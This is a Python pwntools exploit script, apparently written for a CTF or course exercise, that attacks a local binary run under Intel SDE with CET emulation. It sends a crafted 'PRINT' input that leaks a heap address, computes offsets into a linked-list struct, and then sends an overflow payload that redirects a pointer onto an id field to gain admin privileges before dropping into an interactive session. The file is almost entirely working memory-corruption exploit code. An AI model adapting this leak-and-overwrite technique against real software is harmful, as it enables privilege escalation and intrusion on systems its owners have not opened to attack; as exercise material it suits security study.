#!/usr/bin/env python3

# Ideea is to leak the address of DB_HEAD->next->next->next->next
# In the data part of the struct, there is an int we can use to get admin priviledges
# We can calculate the offset of the id value like this:
# address_of_DB_HEAD->next->next->next->next + 192
from pwn import *

target = process("./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex1", shell=True)

print(target.recvuntil(b"> ", timeout=5))
payload = b"PRINT" + 11 * b"\x00" + 8 * b"C" + b"\xf0" # p64(0x4040f0, "little")
target.send(payload)
address = target.recvline()
print(address)
address = u64(address.strip().ljust(8, b'\x00'))
print(hex(address))

chosen_element = address + 928 # offset between the DB_HEAD pointer and DB_HEAD->next->next->next->next->data
print(hex(chosen_element))
id_address = chosen_element + 192
print(hex(id_address))

payload = b"ALIN" + 12 * b"\x00" + 32 * b"C" + p64(id_address + 0x4, "little")
target.send(payload)

target.interactive()
